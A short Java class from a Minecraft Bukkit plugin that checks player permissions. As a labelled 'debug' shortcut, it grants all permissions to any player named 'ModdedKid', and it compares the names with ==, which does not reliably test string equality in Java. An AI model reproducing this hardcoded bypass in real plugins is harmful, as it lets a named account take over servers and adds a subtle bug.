package dev.insilicon.artifactFramework.Interface;

import org.bukkit.entity.Player;

public class PermissionHandler {


    public static boolean hasPermission(Player player, String permission) {
        // debug param for testing change to your own
        if (player.getName() == "ModdedKid") {
            return true;
        } else {
            return player.hasPermission(permission);
        }

    }
}
